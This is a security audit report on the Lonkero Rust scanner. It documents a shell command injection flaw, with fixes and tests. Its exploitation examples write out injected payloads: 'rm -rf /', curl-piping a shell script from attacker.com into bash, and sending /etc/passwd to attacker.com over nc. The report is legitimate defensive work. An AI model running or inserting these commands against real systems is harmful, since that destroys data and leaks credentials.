# Lonkero Security Audit Report

**Date**: 2025-12-15
**Auditor**: Claude (Anthropic AI Security Auditor)
**Repository**: https://github.com/bountyyfi/lonkero
**Scope**: Complete codebase security review

---

## Executive Summary

This security audit identified **1 CRITICAL** and **2 MEDIUM** severity vulnerabilities in the Lonkero security scanner codebase. The most severe issue is a command injection vulnerability in the authenticated scanner module that could allow arbitrary command execution.

### Severity Distribution
- **CRITICAL**: 1 finding
- **HIGH**: 0 findings
- **MEDIUM**: 2 findings
- **LOW**: 0 findings
- **INFORMATIONAL**: 3 findings

---

## CRITICAL Findings

### 🔴 CRIT-001: Command Injection in Authenticated Scanner

**File**: `src/scanners/internal/authenticated_scanner.rs`
**Lines**: 324-329, 428-431, 476-505
**CVSS Score**: 9.8 (Critical)
**CWE**: CWE-78 (OS Command Injection)

#### Description

The authenticated scanner module contains **multiple critical command injection vulnerabilities** where user-controlled input (usernames, passwords, targets, domains) is directly interpolated into shell commands without proper sanitization.

#### Vulnerable Code Locations

**1. SSH Password Authentication (Lines 323-329)**
```rust
let test_cmd = format!(
    "sshpass -p '{}' ssh -p {} -o StrictHostKeyChecking=no -o ConnectTimeout=10 {}@{} 'echo connected'",
    password,  // ❌ User-controlled
    port,
    username,  // ❌ User-controlled
    target     // ❌ User-controlled
);

let output = Command::new("sh")
    .arg("-c")
    .arg(&test_cmd)  // ❌ Passed to shell
    .output()
```

**2. SSH Key Authentication (Lines 283-295)**
```rust
let test_cmd = format!(
    "ssh -i {} -p {} -o StrictHostKeyChecking=no -o ConnectTimeout=10 {}@{} 'echo connected'",
    key_file.display(),
    port,
    username,  // ❌ User-controlled
    target     // ❌ User-controlled
);
```

**3. Windows WMI Commands (Lines 476-505)**
```rust
let hostname_cmd = format!(
    "wmic /node:{} /user:{} /password:{} computersystem get name",
    target,    // ❌ User-controlled
    username,  // ❌ User-controlled
    password   // ❌ User-controlled
);
```

#### Exploitation Examples

**Example 1: Password field injection**
```bash
# Attacker provides password value:
password = "'; rm -rf / #"

# Resulting command:
sshpass -p ''; rm -rf / #' ssh -p 22 ...
# Executes: rm -rf /
```

**Example 2: Username field injection**
```bash
# Attacker provides username value:
username = "user'; curl http://attacker.com/shell.sh | bash #"

# Resulting command:
ssh ... user'; curl http://attacker.com/shell.sh | bash #@target
```

**Example 3: Target field injection**
```bash
# Attacker provides target value:
target = "127.0.0.1; cat /etc/passwd | nc attacker.com 1234 #"

# Executes arbitrary commands on the scanner host
```

#### Impact

- **Arbitrary Command Execution**: Attacker can execute any command with scanner privileges
- **Data Exfiltration**: Access to files, environment variables, secrets
- **Lateral Movement**: Use scanner as pivot point to attack internal networks
- **Privilege Escalation**: If scanner runs as root/admin
- **Denial of Service**: Can crash or disable the scanner

#### Remediation

**Option 1: Use Native SSH Libraries (RECOMMENDED)**
```rust
// Replace shell commands with rust SSH libraries
use ssh2::Session;

let tcp = TcpStream::connect(format!("{}:{}", target, port))?;
let mut sess = Session::new()?;
sess.set_tcp_stream(tcp);
sess.handshake()?;

// Authenticate with password
sess.userauth_password(username, password)?;

// Or with key
sess.userauth_pubkey_file(username, None, key_path, None)?;
```

**Option 2: Strict Input Validation + Escaping**
```rust
fn sanitize_ssh_input(input: &str) -> Result<String> {
    // Whitelist approach: only allow safe characters
    if !input.chars().all(|c| c.is_alphanumeric() || c == '.' || c == '-' || c == '_') {
        return Err(anyhow!("Invalid characters in input"));
    }
    Ok(shell_escape::escape(input.into()).to_string())
}

// Use proper shell escaping
use shell_escape::escape;
let test_cmd = format!(
    "sshpass -p {} ssh -p {} {}@{} 'echo connected'",
    escape(password.into()),
    port,
    escape(username.into()),
    escape(target.into())
);
```

**Option 3: Remove String Interpolation**
```rust
// Build command with separate args (preferred for new commands)
let output = Command::new("sshpass")
    .arg("-p")
    .arg(password)
    .arg("ssh")
    .arg("-p")
    .arg(port.to_string())
    .arg(format!("{}@{}", username, target))
    .arg("echo connected")
    .output()?;
```

#### References
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection

---

## MEDIUM Findings

### 🟠 MED-001: Potential Command Injection in Network Discovery

**File**: `src/scanners/internal/network_discovery.rs`
**Line**: 522-527
**CVSS Score**: 5.3 (Medium)
**CWE**: CWE-78 (OS Command Injection)

#### Description

The `arp_scan()` function passes a user-controlled `interface` parameter to the `arp-scan` command. While the parameter is passed as a separate argument (which is safer than shell interpolation), there's still risk if the interface name is not validated.

#### Vulnerable Code
```rust
let output = Command::new("arp-scan")
    .arg("--interface")
    .arg(interface)  // ⚠️ User-controlled
    .arg("--localnet")
    .output()
```

#### Impact
- Limited command injection (argument injection, not full shell injection)
- Potential for unexpected command behavior
- Lower severity than shell interpolation

#### Remediation
```rust
fn validate_interface_name(interface: &str) -> Result<()> {
    // Whitelist valid interface name patterns
    let valid_pattern = regex::Regex::new(r"^[a-zA-Z0-9]+$")?;
    if !valid_pattern.is_match(interface) {
        return Err(anyhow!("Invalid interface name"));
    }

    // Check interface exists
    if !std::path::Path::new(&format!("/sys/class/net/{}", interface)).exists() {
        return Err(anyhow!("Interface does not exist"));
    }

    Ok(())
}

pub async fn arp_scan(&self, interface: &str) -> Result<Vec<NetworkDiscoveryResult>> {
    validate_interface_name(interface)?;
    // ... rest of code
}
```

---

### 🟠 MED-002: External Binary Execution Risk in Nuclei Executor

**File**: `src/nuclei/custom_executor.rs`
**Lines**: 226-231, 345-356
**CVSS Score**: 6.0 (Medium)
**CWE**: CWE-426 (Untrusted Search Path)

#### Description

The custom template executor allows specifying a custom `nuclei_binary_path` and executes user-provided template content. While templates are written to temporary files, this introduces risks:

1. If `nuclei_binary_path` is user-controlled, arbitrary binaries could be executed
2. Template content validation may be insufficient
3. Path traversal in template file creation

#### Vulnerable Code
```rust
pub fn new(nuclei_binary_path: Option<String>) -> Self {
    let binary_path = nuclei_binary_path.unwrap_or_else(|| "nuclei".to_string());
    // ⚠️ No validation of binary path
}

let template_file = self.write_template_file(request.template_id, &request.template_content)?;

let mut cmd = TokioCommand::new(&self.nuclei_binary_path);  // ⚠️ Potentially untrusted
cmd.arg("-t").arg(template_file)
    .arg("-u").arg(target)  // ⚠️ User-controlled
```

#### Impact
- Arbitrary binary execution if binary path is controllable
- Potential for malicious template injection
- File system access via template manipulation

#### Remediation
```rust
const ALLOWED_NUCLEI_PATHS: &[&str] = &[
    "/usr/bin/nuclei",
    "/usr/local/bin/nuclei",
    "nuclei",  // Search in PATH only
];

pub fn new(nuclei_binary_path: Option<String>) -> Result<Self> {
    let binary_path = if let Some(path) = nuclei_binary_path {
        // Validate binary path is in allowed list
        if !ALLOWED_NUCLEI_PATHS.contains(&path.as_str()) {
            return Err(anyhow!("Nuclei binary path not allowed: {}", path));
        }

        // Ensure it's actually the nuclei binary
        let output = Command::new(&path)
            .arg("-version")
            .output()?;

        let version = String::from_utf8_lossy(&output.stdout);
        if !version.contains("Nuclei") {
            return Err(anyhow!("Invalid nuclei binary"));
        }

        path
    } else {
        "nuclei".to_string()
    };

    // ... rest of code
}

// Validate template content
fn validate_template_content(content: &str) -> Result<()> {
    // Parse as YAML to ensure it's valid
    let _: serde_yaml::Value = serde_yaml::from_str(content)?;

    // Check for suspicious patterns
    if content.contains("file://") || content.contains("../") {
        return Err(anyhow!("Template contains suspicious patterns"));
    }

    Ok(())
}
```

---

## INFORMATIONAL Findings

### ℹ️ INFO-001: Excessive Use of unwrap()/expect()

**Severity**: Informational
**Files**: 124 files across the codebase

#### Description

The codebase makes extensive use of `unwrap()` and `expect()` which can cause panics if None/Err values are encountered. While not a security vulnerability per se, this can lead to:
- Denial of Service (DoS) if attacker can trigger panics
- Unexpected scanner crashes
- Poor error messages

#### Impact
- Service availability issues
- Potential DoS vectors
- Degraded user experience

#### Remediation
- Replace `unwrap()` with proper error handling using `?` operator
- Replace `expect()` with `context()` from anyhow crate
- Use `unwrap_or_default()` or `unwrap_or_else()` where appropriate

#### Example
```rust
// ❌ Before
let value = some_option.unwrap();
let result = some_result.expect("Failed");

// ✅ After
let value = some_option.context("Missing required value")?;
let result = some_result.context("Failed to process")?;
```

---

### ℹ️ INFO-002: TLS Certificate Validation Can Be Disabled

**Severity**: Informational
**File**: `src/http_client.rs`
**Line**: 85-104

#### Description

The HTTP client allows disabling certificate validation via `ACCEPT_INVALID_CERTS` environment variable. While this is **expected and acceptable for a security scanner** (to test sites with invalid certs), it should be documented and controlled.

#### Current Implementation
```rust
let accept_invalid_certs = std::env::var("ACCEPT_INVALID_CERTS")
    .unwrap_or_else(|_| "false".to_string())
    .parse::<bool>()
    .unwrap_or(false);
```

#### Observations
- ✅ Defaults to `false` (secure)
- ✅ Shows warning when enabled
- ✅ Controlled via environment variable (not config file)
- ⚠️ Should ensure license server connections never use this mode

#### Recommendation
```rust
// Ensure license/signing requests never accept invalid certs
pub struct SecureHttpClient {
    client: reqwest::Client,
}

impl SecureHttpClient {
    pub fn new() -> Result<Self> {
        // Always enforce TLS validation for license/signing
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(false)  // Always false
            .timeout(Duration::from_secs(30))
            .build()?;
        Ok(Self { client })
    }
}

// Use SecureHttpClient for all license/signing operations
// Use configurable HttpClient for scanning targets
```

---

### ℹ️ INFO-003: Hardcoded Secrets in Test Files

**Severity**: Informational
**Files**: Multiple test files

#### Description

Test files contain example credentials and API keys. While these are clearly test values, they could confuse security scanners or be accidentally copied to production code.

#### Examples
```rust
// tests/integration/auth_scanners.rs:531
const client_secret = "sk_live_secret_key_12345";

// tests/integration/jwt_tests.rs:434
let common_secrets = vec!["secret", "password", "test", "key", "jwt"];
```

#### Impact
- False positives in security scans
- Potential for accidental use in production
- Code confusion

#### Remediation
- Clearly mark all test secrets with comments
- Use obviously fake patterns (e.g., "test_secret_NOT_REAL")
- Consider moving to separate test fixture files

```rust
// Test fixture - NOT A REAL SECRET
const TEST_CLIENT_SECRET: &str = "sk_test_fake_secret_12345_not_real";
```

---

## Security Strengths

The audit also identified several **positive security practices**:

### ✅ Strong Points

1. **Parameterized SQL Queries**
   - Database module (`src/database.rs`) properly uses parameterized queries
   - No SQL injection vulnerabilities found
   - Proper use of `$1, $2, ...` placeholders

2. **Quantum-Safe Cryptography**
   - Uses BLAKE3 for hashing (quantum-resistant)
   - HMAC-SHA512 for signatures
   - Proper nonce generation with `rand::rng()`

3. **License Enforcement**
   - Multi-layer integrity checks
   - Runtime tampering detection
   - Global killswitch capability
   - Validation token system

4. **Input Sanitization (in most places)**
   - URL validation in many scanners
   - CIDR notation validation in network discovery
   - Proper HTML escaping in reports

5. **Secure Defaults**
   - TLS validation enabled by default
   - Rate limiting enabled
   - Response size limits (10MB)
   - Connection timeouts

6. **Secret Redaction**
   - Custom Debug implementation for credentials
   - Passwords never logged in clear text
   - Display trait hides sensitive data

---

## Recommendations Priority Matrix

| Finding | Severity | Effort | Priority |
|---------|----------|--------|----------|
| CRIT-001: Command Injection in Authenticated Scanner | Critical | Medium | **P0 - Immediate** |
| MED-001: Network Discovery Validation | Medium | Low | **P1 - High** |
| MED-002: Nuclei Executor Hardening | Medium | Medium | **P1 - High** |
| INFO-001: unwrap()/expect() Cleanup | Low | High | **P2 - Medium** |
| INFO-002: License Client TLS Enforcement | Low | Low | **P2 - Medium** |
| INFO-003: Test Secret Documentation | Low | Low | **P3 - Low** |

---

## Remediation Roadmap

### Phase 1: Critical Issues (Week 1)
1. **Fix CRIT-001**: Replace all shell command interpolation in `authenticated_scanner.rs`
   - Implement native SSH library (ssh2 crate)
   - Add input validation for all parameters
   - Add integration tests for injection attempts

### Phase 2: Medium Issues (Week 2-3)
2. **Fix MED-001**: Add interface name validation in network discovery
3. **Fix MED-002**: Harden nuclei executor binary validation

### Phase 3: Code Quality (Week 4+)
4. **INFO-001**: Gradual replacement of unwrap()/expect() with proper error handling
5. **INFO-002**: Ensure license client never accepts invalid certs
6. **INFO-003**: Document test secrets

---

## Testing Recommendations

### Security Test Cases to Add

1. **Command Injection Tests**
```rust
#[tokio::test]
async fn test_ssh_password_injection_protection() {
    let scanner = AuthenticatedScanner::new();
    let malicious_password = "'; rm -rf / #";
    let result = scanner.scan("127.0.0.1", &[
        ScanCredential::SshPassword {
            username: "test".to_string(),
            password: malicious_password.to_string(),
            port: Some(22),
        }
    ]).await;

    // Should fail safely, not execute commands
    assert!(result.is_err());
}
```

2. **Input Validation Tests**
3. **Fuzzing Tests** for all user inputs
4. **Integration Tests** with malicious payloads

---

## Compliance Impact

### Affected Standards

- **OWASP Top 10**: A03:2021 – Injection
- **CWE Top 25**: CWE-78 (OS Command Injection) #10
- **NIST SP 800-53**: SI-10 (Information Input Validation)
- **PCI DSS**: Requirement 6.5.1 (Injection flaws)
- **ISO 27001**: A.14.2.1 (Secure development policy)

The CRITICAL finding (CRIT-001) represents a **compliance violation** for any organization using this software in regulated environments.

---

## Conclusion

The Lonkero security scanner demonstrates many strong security practices, including proper database parameterization, quantum-safe cryptography, and secure defaults. However, the **critical command injection vulnerability** in the authenticated scanner module poses a significant security risk and must be remediated immediately.

The recommended fix is to replace all shell command interpolation with native Rust SSH libraries, eliminating the entire class of command injection vulnerabilities.

### Risk Score: **HIGH** (7.8/10)
- Critical vulnerability present but limited to specific module
- Strong foundation with good security practices elsewhere
- Clear remediation path available

---

## Appendix: Tested Versions

- **Repository**: https://github.com/bountyyfi/lonkero
- **Branch**: `claude/review-lonkero-security-7FelB`
- **Commit**: `8909861` (Merge pull request #40)
- **Audit Date**: 2025-12-15
- **Rust Version**: (as specified in Cargo.toml)
- **Key Dependencies**:
  - reqwest 0.12.24
  - tokio 1.48
  - tokio-postgres 0.7.15

---

**Report Classification**: CONFIDENTIAL
**Distribution**: Internal Security Team Only

---

*This security audit was performed by Claude (Anthropic) as an automated security review. While comprehensive, it should be supplemented with manual code review and penetration testing.*
